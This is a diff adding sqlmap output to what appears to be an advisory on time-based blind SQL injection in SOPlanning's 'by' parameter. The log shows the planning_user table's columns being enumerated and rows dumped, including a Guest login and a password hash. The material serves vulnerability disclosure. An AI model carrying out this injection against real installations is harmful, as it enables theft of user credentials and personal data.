@@ -60,3 +60,54 @@ Parameter: by (GET)
 
 Because it's time based it will take a while to retrieve the user details, but you will retrieve password hashes.
 
+````
+[11:13:34] [INFO] retrieved: user_id
+[11:13:49] [INFO] retrieved: user_groupe_id
+[11:14:30] [INFO] retrieved: nom
+[11:14:37] [INFO] retrieved: login
+[11:14:49] [INFO] retrieved: password
+[11:15:07] [INFO] retrieved: email
+[11:15:19] [INFO] retrieved: visible_planning
+[11:15:53] [INFO] retrieved: couleur
+[11:16:07] [INFO] retrieved: droits
+[11:16:20] [INFO] retrieved: cle
+[11:16:27] [INFO] retrieved: notifications
+[11:16:54] [INFO] retrieved: adresse
+[11:17:09] [INFO] retrieved: telephone
+[11:17:27] [INFO] retrieved: mobile
+[11:17:41] [INFO] retrieved: metier
+[11:17:53] [INFO] retrieved: commentaire
+[11:18:15] [INFO] retrieved: date_dernier_login
+[11:18:54] [INFO] retrieved: preferences
+[11:19:17] [INFO] retrieved: login_actif
+[11:19:39] [INFO] fetching entries for table 'planning_user' in database 'soplanning'
+[11:19:39] [INFO] fetching number of entries for table 'planning_user' in database 'soplanning'
+[11:19:39] [INFO] retrieved: 6
+[11:19:41] [INFO] retrieved:  
+[11:19:45] [INFO] retrieved: 
+[11:19:45] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+[11:19:54] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+
+[11:19:55] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[11:19:55] [INFO] retrieved:  
+[11:19:58] [INFO] retrieved:  
+[11:20:01] [INFO] retrieved:  
+[11:20:04] [INFO] retrieved:  
+[11:20:08] [INFO] retrieved:  
+[11:20:11] [INFO] retrieved:  
+[11:20:14] [INFO] retrieved: oui
+[11:20:22] [INFO] retrieved:  
+[11:20:25] [INFO] retrieved:  
+[11:20:29] [INFO] retrieved: Guest
+[11:20:40] [INFO] retrieved: non
+[11:20:48] [INFO] retrieved:  
+[11:20:51] [INFO] retrieved:  
+[11:20:55] [INFO] retrieved:  
+[11:20:58] [INFO] retrieved:  
+[11:21:01] [INFO] retrieved: publicspl
+[11:21:18] [INFO] retrieved: non
+[11:21:24] [INFO] retrieved:  
+[11:21:27] [INFO] retrieved: 3b23d5b0759fe017325e0c31eee5beed
+[11:22:37] [INFO] retrieved:  
+[11:22:41] [INFO] retrieved: 000000
+````
